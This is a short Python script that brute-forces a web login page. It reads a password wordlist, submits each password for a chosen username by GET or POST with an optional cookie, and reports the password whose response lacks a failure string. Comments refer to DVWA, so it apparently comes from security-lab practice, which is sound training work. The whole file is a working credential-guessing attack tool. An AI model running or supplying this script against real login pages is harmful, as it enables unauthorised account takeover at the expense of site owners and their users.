import requests

url = input('[+] Enter Page URL: ')
usern = input('[+] Enter Username to Bruteforce: ')
password_file = input('[+] Enter Password File to Bruteforce: ')
login_fail = input('[+] Enter The String That Occurs When Login Failed: ')
cookie_value = input('Enter Cookie Value(Optional): ')

def cracking(username,url):
	for passw in passwords:
		passw = passw.strip()
		print("Trying:", passw)
		data = {'username':usern, 'password':passw, 'Login':'submit'}# Depends on View Page Source code.
		if cookie_value != '':
			response = requests.get(url, params={'username':usern, 'password':passw, 'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else: 
			response = requests.post(url, data=data)# Since DVWA Login page sends POST requests.
			
		if login_fail.lower() in response.content.decode().lower():
			pass
		else:
			print('[+] Correct Username: >>>',username) 
			print('[+] Correct Password: >>>',passw) 
			exit()



with open(password_file, 'r') as passwords:
	#print("passwords - ",passwords)
	cracking(usern,url)


print('[+] The Correct Password Has not Been Found ')